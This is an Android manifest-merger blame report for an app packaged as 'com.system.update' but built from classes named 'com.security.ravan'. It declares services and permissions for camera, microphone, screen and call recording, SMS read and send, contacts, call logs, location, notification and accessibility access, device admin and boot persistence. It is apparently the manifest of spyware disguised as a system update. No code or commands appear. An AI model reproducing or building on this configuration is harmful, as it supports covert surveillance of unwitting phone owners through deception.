app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.system.update"
4    android:versionCode="279"
5    android:versionName="4.5.9" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
9        android:targetSdkVersion="34" />
10
11    <!-- Network Permissions -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
14-->src/main/AndroidManifest.xml:8:5-76
14-->src/main/AndroidManifest.xml:8:22-73
15    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
15-->src/main/AndroidManifest.xml:9:5-76
15-->src/main/AndroidManifest.xml:9:22-73
16
17    <!-- Storage Permissions -->
18    <uses-permission
18-->src/main/AndroidManifest.xml:12:5-13:38
19        android:name="android.permission.READ_EXTERNAL_STORAGE"
19-->src/main/AndroidManifest.xml:12:22-77
20        android:maxSdkVersion="32" />
20-->src/main/AndroidManifest.xml:13:9-35
21    <uses-permission
21-->src/main/AndroidManifest.xml:14:5-16:40
22        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
22-->src/main/AndroidManifest.xml:14:22-78
23        android:maxSdkVersion="29" />
23-->src/main/AndroidManifest.xml:15:9-35
24    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
24-->src/main/AndroidManifest.xml:17:5-18:40
24-->src/main/AndroidManifest.xml:17:22-79
25    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
25-->src/main/AndroidManifest.xml:19:5-76
25-->src/main/AndroidManifest.xml:19:22-73
26    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
26-->src/main/AndroidManifest.xml:20:5-75
26-->src/main/AndroidManifest.xml:20:22-72
27    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
27-->src/main/AndroidManifest.xml:21:5-75
27-->src/main/AndroidManifest.xml:21:22-72
28
29    <!-- Call Logs & Contacts -->
30    <uses-permission android:name="android.permission.READ_CALL_LOG" />
30-->src/main/AndroidManifest.xml:24:5-72
30-->src/main/AndroidManifest.xml:24:22-69
31    <uses-permission android:name="android.permission.READ_CONTACTS" />
31-->src/main/AndroidManifest.xml:25:5-72
31-->src/main/AndroidManifest.xml:25:22-69
32
33    <!-- Phone State for Device Info -->
34    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
34-->src/main/AndroidManifest.xml:28:5-75
34-->src/main/AndroidManifest.xml:28:22-72
35
36    <!-- Camera -->
37    <uses-permission android:name="android.permission.CAMERA" />
37-->src/main/AndroidManifest.xml:31:5-65
37-->src/main/AndroidManifest.xml:31:22-62
38
39    <uses-feature
39-->src/main/AndroidManifest.xml:32:5-85
40        android:name="android.hardware.camera"
40-->src/main/AndroidManifest.xml:32:19-57
41        android:required="false" />
41-->src/main/AndroidManifest.xml:32:58-82
42    <uses-feature
42-->src/main/AndroidManifest.xml:33:5-95
43        android:name="android.hardware.camera.autofocus"
43-->src/main/AndroidManifest.xml:33:19-67
44        android:required="false" />
44-->src/main/AndroidManifest.xml:33:68-92
45
46    <!-- Audio for Video Recording and Call Recording -->
47    <uses-permission android:name="android.permission.RECORD_AUDIO" />
47-->src/main/AndroidManifest.xml:36:5-71
47-->src/main/AndroidManifest.xml:36:22-68
48
49    <!-- Phone Call Detection -->
50    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
50-->src/main/AndroidManifest.xml:39:5-81
50-->src/main/AndroidManifest.xml:39:22-78
51
52    <!-- GPS Location -->
53    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
53-->src/main/AndroidManifest.xml:42:5-79
53-->src/main/AndroidManifest.xml:42:22-76
54    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
54-->src/main/AndroidManifest.xml:43:5-81
54-->src/main/AndroidManifest.xml:43:22-78
55
56    <!-- Overlay Permission for Background Camera -->
57    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
57-->src/main/AndroidManifest.xml:46:5-78
57-->src/main/AndroidManifest.xml:46:22-75
58
59    <!-- Foreground Service -->
60    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
60-->src/main/AndroidManifest.xml:49:5-77
60-->src/main/AndroidManifest.xml:49:22-74
61    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
61-->src/main/AndroidManifest.xml:50:5-87
61-->src/main/AndroidManifest.xml:50:22-84
62    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
62-->src/main/AndroidManifest.xml:51:5-84
62-->src/main/AndroidManifest.xml:51:22-81
63    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
63-->src/main/AndroidManifest.xml:52:5-88
63-->src/main/AndroidManifest.xml:52:22-85
64    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
64-->src/main/AndroidManifest.xml:53:5-94
64-->src/main/AndroidManifest.xml:53:22-91
65    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
65-->src/main/AndroidManifest.xml:54:5-77
65-->src/main/AndroidManifest.xml:54:22-74
66
67    <!-- Notification listener permission -->
68    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
68-->src/main/AndroidManifest.xml:57:5-93
68-->src/main/AndroidManifest.xml:57:22-90
69
70    <!-- Keep Running -->
71    <uses-permission android:name="android.permission.WAKE_LOCK" />
71-->src/main/AndroidManifest.xml:60:5-68
71-->src/main/AndroidManifest.xml:60:22-65
72    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
72-->src/main/AndroidManifest.xml:61:5-95
72-->src/main/AndroidManifest.xml:61:22-92
73    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
73-->src/main/AndroidManifest.xml:62:5-81
73-->src/main/AndroidManifest.xml:62:22-78
74    <uses-permission android:name="android.permission.READ_SMS" />
74-->src/main/AndroidManifest.xml:183:5-67
74-->src/main/AndroidManifest.xml:183:22-64
75    <uses-permission android:name="android.permission.SEND_SMS" />
75-->src/main/AndroidManifest.xml:184:5-67
75-->src/main/AndroidManifest.xml:184:22-64
76    <uses-permission android:name="android.permission.WRITE_SMS" />
76-->src/main/AndroidManifest.xml:185:5-68
76-->src/main/AndroidManifest.xml:185:22-65
77    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
77-->src/main/AndroidManifest.xml:186:5-85
77-->src/main/AndroidManifest.xml:186:22-82
78
79    <permission
79-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
80        android:name="com.system.update.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
80-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
81        android:protectionLevel="signature" />
81-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
82
83    <uses-permission android:name="com.system.update.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
83-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
83-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
84
85    <application
85-->src/main/AndroidManifest.xml:64:5-181:19
86        android:allowBackup="true"
86-->src/main/AndroidManifest.xml:65:9-35
87        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
87-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
88        android:debuggable="true"
89        android:extractNativeLibs="false"
90        android:icon="@drawable/ic_system_update"
90-->src/main/AndroidManifest.xml:66:9-50
91        android:label="@string/app_name"
91-->src/main/AndroidManifest.xml:67:9-41
92        android:requestLegacyExternalStorage="true"
92-->src/main/AndroidManifest.xml:71:9-52
93        android:roundIcon="@drawable/ic_system_update"
93-->src/main/AndroidManifest.xml:68:9-55
94        android:supportsRtl="true"
94-->src/main/AndroidManifest.xml:69:9-35
95        android:theme="@style/Theme.RavanSecurity"
95-->src/main/AndroidManifest.xml:70:9-51
96        android:usesCleartextTraffic="true" >
96-->src/main/AndroidManifest.xml:72:9-44
97        <activity
97-->src/main/AndroidManifest.xml:75:9-84:20
98            android:name="com.security.ravan.MainActivity"
98-->src/main/AndroidManifest.xml:76:13-41
99            android:exported="true"
99-->src/main/AndroidManifest.xml:77:13-36
100            android:launchMode="singleTask"
100-->src/main/AndroidManifest.xml:78:13-44
101            android:theme="@style/Theme.RavanSecurity" >
101-->src/main/AndroidManifest.xml:79:13-55
102            <intent-filter>
102-->src/main/AndroidManifest.xml:80:13-83:29
103                <action android:name="android.intent.action.MAIN" />
103-->src/main/AndroidManifest.xml:81:17-69
103-->src/main/AndroidManifest.xml:81:25-66
104
105                <category android:name="android.intent.category.LAUNCHER" />
105-->src/main/AndroidManifest.xml:82:17-77
105-->src/main/AndroidManifest.xml:82:27-74
106            </intent-filter>
107        </activity>
108
109        <service
109-->src/main/AndroidManifest.xml:86:9-90:56
110            android:name="com.security.ravan.HttpServerService"
110-->src/main/AndroidManifest.xml:87:13-46
111            android:enabled="true"
111-->src/main/AndroidManifest.xml:88:13-35
112            android:exported="false"
112-->src/main/AndroidManifest.xml:89:13-37
113            android:foregroundServiceType="dataSync" />
113-->src/main/AndroidManifest.xml:90:13-53
114        <service
114-->src/main/AndroidManifest.xml:92:9-95:40
115            android:name="com.security.ravan.WatchdogService"
115-->src/main/AndroidManifest.xml:93:13-44
116            android:enabled="true"
116-->src/main/AndroidManifest.xml:94:13-35
117            android:exported="false" />
117-->src/main/AndroidManifest.xml:95:13-37
118        <service
118-->src/main/AndroidManifest.xml:97:9-101:65
119            android:name="com.security.ravan.CameraService"
119-->src/main/AndroidManifest.xml:98:13-42
120            android:enabled="true"
120-->src/main/AndroidManifest.xml:99:13-35
121            android:exported="false"
121-->src/main/AndroidManifest.xml:100:13-37
122            android:foregroundServiceType="camera|microphone" />
122-->src/main/AndroidManifest.xml:101:13-62
123        <service
123-->src/main/AndroidManifest.xml:103:9-107:63
124            android:name="com.security.ravan.ScreenCaptureService"
124-->src/main/AndroidManifest.xml:104:13-49
125            android:enabled="true"
125-->src/main/AndroidManifest.xml:105:13-35
126            android:exported="false"
126-->src/main/AndroidManifest.xml:106:13-37
127            android:foregroundServiceType="mediaProjection" />
127-->src/main/AndroidManifest.xml:107:13-60
128        <service
128-->src/main/AndroidManifest.xml:109:9-113:63
129            android:name="com.security.ravan.ScreenRecordService"
129-->src/main/AndroidManifest.xml:110:13-48
130            android:enabled="true"
130-->src/main/AndroidManifest.xml:111:13-35
131            android:exported="false"
131-->src/main/AndroidManifest.xml:112:13-37
132            android:foregroundServiceType="mediaProjection" />
132-->src/main/AndroidManifest.xml:113:13-60
133
134        <receiver
134-->src/main/AndroidManifest.xml:115:9-123:20
135            android:name="com.security.ravan.BootReceiver"
135-->src/main/AndroidManifest.xml:116:13-41
136            android:enabled="true"
136-->src/main/AndroidManifest.xml:117:13-35
137            android:exported="true" >
137-->src/main/AndroidManifest.xml:118:13-36
138            <intent-filter>
138-->src/main/AndroidManifest.xml:119:13-122:29
139                <action android:name="android.intent.action.BOOT_COMPLETED" />
139-->src/main/AndroidManifest.xml:120:17-79
139-->src/main/AndroidManifest.xml:120:25-76
140                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
140-->src/main/AndroidManifest.xml:121:17-82
140-->src/main/AndroidManifest.xml:121:25-79
141            </intent-filter>
142        </receiver>
143
144        <!-- Call Record Service for audio capture -->
145        <service
145-->src/main/AndroidManifest.xml:126:9-130:58
146            android:name="com.security.ravan.CallRecordService"
146-->src/main/AndroidManifest.xml:127:13-46
147            android:enabled="true"
147-->src/main/AndroidManifest.xml:128:13-35
148            android:exported="false"
148-->src/main/AndroidManifest.xml:129:13-37
149            android:foregroundServiceType="microphone" />
149-->src/main/AndroidManifest.xml:130:13-55
150
151        <!-- Call Receiver for detecting incoming/outgoing calls -->
152        <receiver
152-->src/main/AndroidManifest.xml:133:9-141:20
153            android:name="com.security.ravan.CallReceiver"
153-->src/main/AndroidManifest.xml:134:13-41
154            android:enabled="true"
154-->src/main/AndroidManifest.xml:135:13-35
155            android:exported="true" >
155-->src/main/AndroidManifest.xml:136:13-36
156            <intent-filter>
156-->src/main/AndroidManifest.xml:137:13-140:29
157                <action android:name="android.intent.action.PHONE_STATE" />
157-->src/main/AndroidManifest.xml:138:17-76
157-->src/main/AndroidManifest.xml:138:25-73
158                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
158-->src/main/AndroidManifest.xml:139:17-82
158-->src/main/AndroidManifest.xml:139:25-79
159            </intent-filter>
160        </receiver>
161
162        <!-- Launcher Refresh Accessibility Service -->
163        <service
163-->src/main/AndroidManifest.xml:144:9-155:19
164            android:name="com.security.ravan.LauncherRefreshService"
164-->src/main/AndroidManifest.xml:145:13-51
165            android:enabled="true"
165-->src/main/AndroidManifest.xml:146:13-35
166            android:exported="false"
166-->src/main/AndroidManifest.xml:147:13-37
167            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
167-->src/main/AndroidManifest.xml:148:13-79
168            <intent-filter>
168-->src/main/AndroidManifest.xml:149:13-151:29
169                <action android:name="android.accessibilityservice.AccessibilityService" />
169-->src/main/AndroidManifest.xml:150:17-92
169-->src/main/AndroidManifest.xml:150:25-89
170            </intent-filter>
171
172            <meta-data
172-->src/main/AndroidManifest.xml:152:13-154:72
173                android:name="android.accessibilityservice"
173-->src/main/AndroidManifest.xml:153:17-60
174                android:resource="@xml/accessibility_service_config" />
174-->src/main/AndroidManifest.xml:154:17-69
175        </service>
176
177        <!-- Notification listener service -->
178        <service
178-->src/main/AndroidManifest.xml:158:9-166:19
179            android:name="com.security.ravan.NotificationListener"
179-->src/main/AndroidManifest.xml:159:13-49
180            android:enabled="true"
180-->src/main/AndroidManifest.xml:160:13-35
181            android:exported="true"
181-->src/main/AndroidManifest.xml:161:13-36
182            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
182-->src/main/AndroidManifest.xml:162:13-87
183            <intent-filter>
183-->src/main/AndroidManifest.xml:163:13-165:29
184                <action android:name="android.service.notification.NotificationListenerService" />
184-->src/main/AndroidManifest.xml:164:17-99
184-->src/main/AndroidManifest.xml:164:25-96
185            </intent-filter>
186        </service>
187
188        <!-- Device Admin Receiver -->
189        <receiver
189-->src/main/AndroidManifest.xml:169:9-179:20
190            android:name="com.security.ravan.AdminReceiver"
190-->src/main/AndroidManifest.xml:170:13-42
191            android:exported="false"
191-->src/main/AndroidManifest.xml:172:13-37
192            android:permission="android.permission.BIND_DEVICE_ADMIN" >
192-->src/main/AndroidManifest.xml:171:13-70
193            <meta-data
193-->src/main/AndroidManifest.xml:173:13-175:56
194                android:name="android.app.device_admin"
194-->src/main/AndroidManifest.xml:174:17-56
195                android:resource="@xml/device_admin" />
195-->src/main/AndroidManifest.xml:175:17-53
196
197            <intent-filter>
197-->src/main/AndroidManifest.xml:176:13-178:29
198                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
198-->src/main/AndroidManifest.xml:177:17-82
198-->src/main/AndroidManifest.xml:177:25-79
199            </intent-filter>
200        </receiver>
201
202        <provider
202-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
203            android:name="androidx.startup.InitializationProvider"
203-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
204            android:authorities="com.system.update.androidx-startup"
204-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
205            android:exported="false" >
205-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
206            <meta-data
206-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
207                android:name="androidx.emoji2.text.EmojiCompatInitializer"
207-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
208                android:value="androidx.startup" />
208-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
209            <meta-data
209-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
210                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
210-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
211                android:value="androidx.startup" />
211-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
212            <meta-data
212-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
213                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
213-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
214                android:value="androidx.startup" />
214-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
215        </provider>
216
217        <receiver
217-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
218            android:name="androidx.profileinstaller.ProfileInstallReceiver"
218-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
219            android:directBootAware="false"
219-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
220            android:enabled="true"
220-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
221            android:exported="true"
221-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
222            android:permission="android.permission.DUMP" >
222-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
223            <intent-filter>
223-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
224                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
224-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
224-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
225            </intent-filter>
226            <intent-filter>
226-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
227                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
227-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
227-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
228            </intent-filter>
229            <intent-filter>
229-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
230                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
230-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
230-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
231            </intent-filter>
232            <intent-filter>
232-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
233                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
233-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
233-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
234            </intent-filter>
235        </receiver>
236    </application>
237
238</manifest>